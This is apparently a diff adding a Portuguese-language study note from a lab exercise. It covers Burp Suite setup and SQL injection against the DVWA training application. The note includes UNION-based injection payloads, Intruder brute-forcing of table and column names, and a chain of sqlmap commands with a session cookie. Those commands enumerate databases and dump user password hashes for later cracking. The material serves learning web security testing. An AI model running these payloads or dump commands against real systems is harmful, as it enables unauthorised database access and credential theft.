@@ -1,0 +1,101 @@
+Burp Suite 
+-Ja vem no kali linux
+-Ajuda a identificar vulnerabilidades em requisições WEB
+-Funciona como um servidor Proxy
+-Precisa configurar no browser o proxy do burp (127.0.0.1 8080)
+
+Configuração Incial no burp.
+-Proxy>Intercept>intercept off  (Desabilitar a interceptação)
+-Ir no navegador e digitar o endereço do proxy burp (127.0.0.1:8080)
+-Gerar o certificado no "CA certificate" e salvar o arquivo
+-Instalar o certificado no navegador em Preferencias>Avançado>Certificates>View Certificates>Import Certificate (Importar o certificado e marcar todas as opções disponiveis)
+-Configurar o proxy burp no browser.
+
+Explicando abas do BurpSuite
+-Target (Mostra um mapa do que esta sendo acessado)
+-Proxy (Configuração do proxy)
+-Spider (Configuração de identificação de arquivos e etc)
+-Intruder (Faz alguns ataques usando Payloads)
+-Repeater (Modifica valores capturados na aplicação Web)
+-Sequences (Identifica sessões e sockets - Descobre roubous de sessões)
+-Decoder (Desciptografa os dados dentre outras funções)
+
+Nas requisições que o browser fizer, serão vistas no Proxy>Http History no Burp e os Request e Response (Reuqest é a requisição do navegador e response a resposta do servidor remoto)
+-Pode enviar os codigos de requisições entre abas do Burp, para modificar o codigo por exemplo, (Em HTTP Historu, ir com o botão direito na requisição e dar um "send to Repeater)
+
+Para interceptar requisições em tempo real, habilitar em Proxy, o "intercept On"
+
+---------------
+
+SQL Injection com Burp
+
+-Pode ser exploitada em dois metodos (Get e POST)
+
+-Pode-se usar o metodo de colocar campo qualquer na pagina de login de uma aplicação, para visualizarmos a mensagem de erro (login failed, por exemplo) ERROR BASED
+
+Para identificar esse tipo de vulneranilidade, usar numericos e submeter pesquisa e verificar na URL se ha um "id=1" por exemplo.
+-Caso haja, colocar um "'" por exemplo, para verificar se a aplicação retornará erro, o que mostrará que a aplicação esta vulneravel
+-Essa vulnerabilidade permite inserir Codigos SQLs via URL, por exemplo, no campo "id=1" da URL, inserir: id=' order by 1-- '
+### O Inject acima, identifica que as colunas SQL existem na aplicação:, o numero 1 pode ser trocado por 2,3,4,5,6,7... Enfim, até a aplicação responder com erro que a coluna não existe.
+### Acima identificamos que a aplicação esta dando um select no banco de dados
+-Para identificar as colunas existentes no banco de dados da aplicação, inserir no "id=" da URL:
+id= ' union select null, null--
+### O codigo acima faz a união da 1 e 2 coluna da aplicação e Exibe o nome dos Campos.
+id= ' union select null, null from tabela-- 
+### O "from tabela do codigo acima, tenta advinhar o nome da tabela do banco.
+-Nesse caso, ainda não temos o nome da tabela para realizarmos o ataque completo, é necessario verificar no Burp.
+NO BURP:
+-Ir em http history e identificar a requisição mais recente que foi feita na aplicação, e enviar ao Intruder, do burp, com o botão direito.
+-Ir para a aba Intruder>Partitions
+-No pedaço de codigo "tabela", vamos inserir uma variavel com "add $" para que possamos identificar o nome da tabela via Força bruta
+-Ir na aba "payloads" e carregar o arquivo com uma wordlist contendo nome de tabelas mais comuns, o de sua preferencia.
+-Em Payload>Payload Options [simple list], ir em Load e carregar o arquivo (wordlist)
+-No "Payload Sets", marcar o Payload para o campo que marcamos, no caso tabela (1).
+-Ir em "start attack" para começar o ataque.
+  Para identificar as tentativas, ir na Aba "results" e identificar a tentativa com o campo "lengh" maior, para verificar se a tabela existe, clicar duas vezes e ir em "response" pra identificar a resposta da aplicação.
+-Caso a resposta não retorne erro de tabela não encontrada, é sinal que a tabela existe.
+#### Agora é necessario identificar os campos da tabela para identificar usuario e senha do banco de dados.
+
+Retornar para o browser e enjetar o codigo no "id=" novamente, agora com o nome da tabela existente.
+id= ' union select null, null from users--
+### Como informamos os campos "null, null" o SQL não retornara o resultado.
+-Será necessario rodar o PAYLOAD no burp para os campos que queremos saber.
+-Adicionar os campos "null" e "null" como variaveis com o "add $" em Intruder>Positions.
+-Adicionar na Aba Payloads a wordlist para tentativa de descobrir as informações de usuario.
+-Utilizar o mesmo metodo anterior para descobrir existencia dos campos na tabela (pelo Lengh)
+-Inserir o "id=" novamente no navegador, com as informações que descobrimos.
+id= ' union select user, password from users--
+    Caso realmente essas informações forem verdadeiras, a pagina retornará as informações do banco, como usuarios, e senhas em MD5.
+    
+================================================================================================
+
+SQL Injection BLIND
+
+-Nesse metoto, a aplicação não retorna erro ao tentar manipular a pesquisa, inserindo o "'" por exemplo.
+
+Para esse tipo de aplicação, usar o SQLmap, com a URL de submit da aplicação e o cook da sessão, que podemos capturar com o burp.
+-Capturar a URL da aplicação, finalizada em "submit"
+-Capturar o cook da sessão, identificada na requisição no burp, na linha "Cooks"
+-Rodar o SQLmap:
+  sqlmap -u "http://192.168.136.141/dvwa/vulnerabilities/sqli_blind/?id=%27&Submit=Submit" --cookie="security=low; PHPSESSIONID=0seer15sdfsd54saasssd0asccd054"
+ 
+ ####### Usa o metoto "time-based", que identifica o tempo de resposta do banco de dados identificando qual Banco esta sendo utilizado.
+ EX: mysql=3 segundos, SQL Server=1,5 Segundos, PostgreSql=5 Segundos
+ 
+ O SQLmap roda interativo, portando no padrão ir respondendo "não" (N) nas respostas.
+  *Apos o camando finalizar ele identificara as vulnertabilidades do banco, rodar novamente, porem com o parametro "--dbs" para extrair informações.
+  
+   sqlmap -u "http://192.168.136.141/dvwa/vulnerabilities/sqli_blind/?id=%27&Submit=Submit" --cookie="security=low; PHPSESSIONID=0seer15sdfsd54saasssd0asccd054" --dbs
+-Se tudo ocorrer corretamente, o SQLmap identificara as databases disponiveis no banco de dados.
+
+Rodar novamente o comando acima selecionando uma database com o parametro "-D" e "--tables" para identificar as tabelas
+  sqlmap -u "http://192.168.136.141/dvwa/vulnerabilities/sqli_blind/?id=%27&Submit=Submit" --cookie="security=low; PHPSESSIONID=0seer15sdfsd54saasssd0asccd054" --D dvwa --tables  
+-Se tudo ocorrer corretamente, as tabelas serão descobertas.
+
+Rodar novamente para descobrir as colunas das tabelas, com as opções "-T users" e "--columns"
+  sqlmap -u "http://192.168.136.141/dvwa/vulnerabilities/sqli_blind/?id=%27&Submit=Submit" --cookie="security=low; PHPSESSIONID=0seer15sdfsd54saasssd0asccd054" --D dvwa --tables -T users --columns
+-As informações descobertas serão os valores das colunas.
+
+Rodar novamente para listar os valores das colunas informados pelo comando anterior com as opções "-C user_id,user,password  e "--dump"
+  sqlmap -u "http://192.168.136.141/dvwa/vulnerabilities/sqli_blind/?id=%27&Submit=Submit" --cookie="security=low; PHPSESSIONID=0seer15sdfsd54saasssd0asccd054" --D dvwa --tables -T users --columns -C nome_user,user1 --dump
+-O comando acima, permite guardar os hashs de senhas dos usuarios para quebra posteriormente e até mesmo quebar com lista de senhas.
